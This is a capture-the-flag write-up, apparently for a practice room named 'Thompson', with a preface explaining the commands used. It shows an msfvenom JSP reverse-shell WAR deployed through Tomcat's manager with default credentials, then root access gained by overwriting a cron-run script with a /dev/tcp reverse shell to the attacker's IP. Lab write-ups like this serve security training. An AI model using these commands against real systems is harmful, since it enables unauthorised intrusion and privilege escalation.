------------------------------------------------------------------------------------------------------------------------------------

NOTE:-

You're generating a reverse shell payload in WAR format using Metasploit‚Äôs msfvenom. Here's a breakdown of what it does and how to use it effectively.
‚úÖ Command Explained:

msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your-IP> LPORT=4444 -f war > shell.war

Option	Description
-p java/jsp_shell_reverse_tcp	Payload that opens a reverse shell using Java Server Pages (JSP).
LHOST=<Your-IP>	Your IP address (listener machine).
LPORT=4444	Port on your machine that the shell will connect to.
-f war	Format: WAR (Web Application Archive ‚Äì used in Java web servers like Tomcat).
> shell.war	Saves the output payload to shell.war.

üéØ Target Use
WAR payloads are meant for:

    Tomcat
    JBoss
    Any Java-based application server that auto-deploys .war files

Once uploaded and deployed, the .jsp inside the WAR triggers the reverse shell.


üîß What Is a Cron Job?

A cron job is a scheduled task in Unix/Linux that runs a command or script at specified times or intervals. It uses the cron daemon to automate things like backups, system updates, or ‚Äî in your case ‚Äî running a script.

The format of a cron job is:

* * * * * user command
‚îÇ ‚îÇ ‚îÇ ‚îÇ ‚îÇ
‚îÇ ‚îÇ ‚îÇ ‚îÇ ‚îî‚îÄ‚îÄ Day of the Week (0-7) (Sunday is both 0 and 7)
‚îÇ ‚îÇ ‚îÇ ‚îî‚îÄ‚îÄ‚îÄ‚îÄ Month (1-12)
‚îÇ ‚îÇ ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ Day of the Month (1-31)
‚îÇ ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ Hour (0-23)
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ Minute (0-59)

üî• Your Specific Cron Entry

* * * * * root cd /home/jack && bash id.sh

This means:

    Run every minute of every hour/day/month.

    Run as the root user.

    Go to /home/jack and execute bash id.sh.

üêö What's Inside id.sh?

bash -i >& /dev/tcp/10.13.30.5/1234 0>&1

This line is a reverse shell. It tells the machine to:

    Use an interactive bash shell (-i)

    Redirect its input/output (>&) over TCP

    Connect to IP 10.13.30.5 on port 1234

This allows an attacker to control the system remotely if they are listening on that IP and port.
‚ö†Ô∏è Summary

    You're using a cron job to execute a reverse shell script (id.sh) every minute.

    This is commonly used in CTF challenges, red teaming, or hacking scenarios to maintain or gain remote access.

------------------------------------------------------------------------------------------------------------------------------------

Thompson

This room focuses on demonstrating the exploitation of a Tomcat web server, starting from unintended disclosure of credentials to gaining root access, incorporating privilege escalation techniques and a bit of Linux forensics.

Running Nmap ‚Äî

nmap -A -sV -sC -Pn -v -oN nmap_report 10.10.243.96 
Scanning 10.10.243.96 [1000 ports
Discovered open port 8009/tcp on 10.10.243.96
Completed Connect Scan at 13:27, 205.98s elapsed (1000 total ports)
Initiating Service scan at 13:27
Scanning 3 services on 10.10.243.96
Completed Service scan at 13:27, 11.76s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.243.96.
Initiating NSE at 13:27
Completed NSE at 13:27, 14.74s elapsed
Initiating NSE at 13:27
Completed NSE at 13:27, 1.53s elapsed
Initiating NSE at 13:27
Completed NSE at 13:27, 0.00s elapsed
Nmap scan report for 10.10.243.96
Host is up (0.42s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA)
|   256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA)
|_  256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http    Apache Tomcat 8.5.5
|_http-open-proxy: Proxy might be redirecting requests
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: Apache Tomcat/8.5.5

Findings ‚Äî

Open Ports: 22, 8009, 8080

Note ‚Äî Regarding Apache Tomcat ‚Äî AJP ‚ÄòGhost Cat File Read/Inclusion‚Äô, even though the vulnerability is present it does not reveal any sensitive information.

Directory Fuzzing ‚Äî

feroxbuster --url <http://10.10.243.96/> -C 404 --wordlist /home/kali/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt

Findings ‚Äî

    /docs
    /examples
    /host-manager
    /manager

Sensitive Information Disclosure at /manager ‚Äî

Reveals sensitive information when the cancel option is selected.

Findings ‚Äî

User ‚Äî tomcat

Password ‚Äî s3cret

Role name ‚Äî manager-gui

Logging in and Initial Access ‚Äî

The manager panel shows that war files can be uploaded to the target machine. This is a potential way to gain initial access.

Using msfvenom ‚Äî

msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local machine IP> LPORT=4444 -f war > shell.war

‚Äî Upload the file using the webserver GUI

‚Äî start nc -nvlp 4444 before visiting the /shell directory

Privilege Escalation After Initial Access ‚Äî

nc -nvlp 4444                                      
listening on [any] 4444 ...
connect to [10.13.30.5] from (UNKNOWN) [10.10.243.96] 38244
id
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
python -c 'import pty; pty.spawn("/bin/sh")'
$ /bin/bash -i
/bin/bash -i
tomcat@ubuntu:/home$ ls -la
ls -la
tomcat@ubuntu:/home$ cd jack
cd jack
tomcat@ubuntu:/home/jack$ ls -la
ls -la
total 48
drwxr-xr-x 4 jack jack 4096 Aug 23  2019 .
drwxr-xr-x 3 root root 4096 Aug 14  2019 ..
-rw------- 1 root root 1476 Aug 14  2019 .bash_history
-rw-r--r-- 1 jack jack  220 Aug 14  2019 .bash_logout
-rw-r--r-- 1 jack jack 3771 Aug 14  2019 .bashrc
drwx------ 2 jack jack 4096 Aug 14  2019 .cache
-rwxrwxrwx 1 jack jack   26 Aug 14  2019 id.sh
drwxrwxr-x 2 jack jack 4096 Aug 14  2019 .nano
-rw-r--r-- 1 jack jack  655 Aug 14  2019 .profile
-rw-r--r-- 1 jack jack    0 Aug 14  2019 .sudo_as_admin_successful
-rw-r--r-- 1 root root   39 Jul  8 11:42 test.txt
-rw-rw-r-- 1 jack jack   33 Aug 14  2019 user.txt
-rw-r--r-- 1 root root  183 Aug 14  2019 .wget-hsts
tomcat@ubuntu:/home/jack$ cat user.txt
cat user.txt
39400c90bc683a41a8935e4719f181bf
tomcat@ubuntu:/home/jack$ cat /etc/crontab
# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    cd /home/jack && bash id.sh
tomcat@ubuntu:/home/jack$ echo "bash -i >& /dev/tcp/10.13.30.5/1234 0>&1" > id.sh
tomcat@ubuntu:/home/jack$ cat id.sh
bash -i >& /dev/tcp/10.13.30.5/1234 0>&1            

Findings ‚Äî

-The id.sh script is being run with root user privileges as a cronjob.

-The user tomcat has privileges to write into the file.

-echo a reverse shell command to execute it with elevated privileges and gain root access to the system.

Set up a Netcat listener on the local machine and wait for the cronjob to run the id.sh script as the root user.

nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.13.30.5] from (UNKNOWN) [10.10.243.96] 47290
bash: cannot set terminal process group (1486): Inappropriate ioctl for device
bash: no job control in this shell
root@ubuntu:/home/jack# cd /root
root@ubuntu:~# cat root.txt
cat root.txt
d89d5391984c0450a95497153ae7ca3a
root@ubuntu:~#
